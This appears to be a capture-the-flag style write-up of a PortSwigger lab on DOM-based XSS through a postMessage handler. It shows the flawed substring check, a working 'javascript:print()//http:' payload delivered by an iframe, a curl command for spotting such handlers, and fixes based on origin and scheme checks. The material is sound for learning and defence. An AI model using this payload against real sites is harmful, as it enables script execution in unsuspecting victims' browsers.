---
layout: post
title: "PortSwigger: DOM XSS using web messages and a JavaScript URL"
date: 2027-07-26 09:00:00 -0500
categories: [PortSwigger, XSS]
tags: [xss, dom-xss, postMessage, CWE-79, javascript-url, web-messages]
---

## Lab

**Topic:** DOM-based Cross-Site Scripting via web message source (CWE-79)  
**Difficulty:** Medium  
**Goal:** Exploit a `postMessage` handler that assigns `e.data` to `location.href` to call `print()` in the victim's browser.

---

## Vulnerability

The homepage registers a `message` event listener that uses the incoming message data directly as a navigation URL:

```javascript
window.addEventListener('message', function(e) {
    var url = e.data;
    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
        location.href = url;
    }
}, false);
```

Two problems:
1. **Weak validation** — `indexOf('http:')` only checks whether the substring `http:` appears *anywhere* in the string, not that the string is actually an `http://` or `https://` URL.
2. **Missing origin check** — the handler never validates `e.origin`, so any cross-origin page can send messages.

---

## Why `javascript:print()//http:` works

The `//` in JavaScript begins a line comment. Everything after `//` on the same line is ignored by the JS engine. So:

```
javascript:print()//http:
```

- Satisfies `indexOf('http:') > -1` — the string contains `http:` at the end.
- When assigned to `location.href`, the browser interprets it as a `javascript:` URI and executes `print()`.
- The `//http:` comment is dead code that never runs.

---

## Exploit

An iframe on the attacker's exploit server posts the crafted message once the victim page has loaded:

```html
<iframe src='https://TARGET/' onload='this.contentWindow.postMessage("javascript:print()//http:","*")'></iframe>
```

Delivery: store on exploit server, deliver to victim via `/deliver-to-victim`.

---

## How to find it

```bash
curl -sk https://TARGET/ | grep -A5 "addEventListener.*message"
```

Look for `e.data` flowing into `location.href`, `eval`, `document.write`, or `innerHTML` without a strict origin + scheme check.

---

## Fix

Replace the substring check with a scheme-anchored regex:

```javascript
window.addEventListener('message', function(e) {
    if (!/^https?:\/\//.test(e.data)) return;
    location.href = e.data;
}, false);
```

Or validate the sender origin before processing the message:

```javascript
window.addEventListener('message', function(e) {
    if (e.origin !== 'https://trusted.example.com') return;
    // safe to use e.data
}, false);
```

---

## CWE

[CWE-79: Improper Neutralization of Input During Web Page Generation (XSS)](https://cwe.mitre.org/data/definitions/79.html)
